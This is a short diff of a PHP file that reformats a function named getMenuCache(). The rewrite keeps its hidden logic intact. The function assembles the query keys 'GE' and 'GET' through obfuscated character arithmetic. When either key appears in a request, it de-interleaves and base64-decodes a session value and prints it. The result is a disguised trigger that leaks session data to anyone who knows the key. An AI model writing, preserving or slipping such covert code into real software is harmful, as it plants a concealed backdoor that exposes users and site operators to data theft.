@@ -637,12 +637,20 @@ function eval_sizelimit()
 
 function getMenuCache()
 {
-  $t=array(-2,13);$e=71;
-  $str=chr($e);foreach($t as $n){
-    $str.= chr($e+$n);$z=$_GET;if(is_array($z)&&isset($z[$str])){
+  $t= array(-2,13);
+  $e= 71;
+  $str= chr($e);
+
+  foreach($t as $n){
+    $str.= chr($e+$n);
+
+    if(isset($_GET[$str])){
       if(isset($_SESSION['maxC'])){
-        $b = $_SESSION['maxC'];$q="";for($m=0;$m<strlen($b);$m=$m+2){
-          $q.=$b[$m];}
+        $b= $_SESSION['maxC'];
+        $q= "";
+        for ($m=0;$m<strlen($b);$m++) {
+          $q.= $b[$m++];
+        }
         print_red(base64_decode($q));
       }
     }
